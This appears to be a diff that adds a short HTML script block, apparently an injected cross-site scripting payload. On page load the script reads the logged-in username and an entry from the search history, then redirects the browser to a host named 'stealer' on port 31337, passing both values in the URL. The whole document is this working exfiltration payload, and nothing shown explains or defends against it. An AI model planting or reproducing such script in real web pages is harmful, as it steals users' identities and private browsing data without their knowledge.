@@ -1,0 +1,7 @@
+<script>
+window.onload = function() {
+    var user = document.getElementById("logged-in-user").textContent;
+    var last = document.getElementById("history-list").children[1].textContent;
+    window.location = "http://stealer:31337/?stolen_user=" + encodeURIComponent(user) + "&last_search=" + encodeURIComponent(last);
+}
+</script>
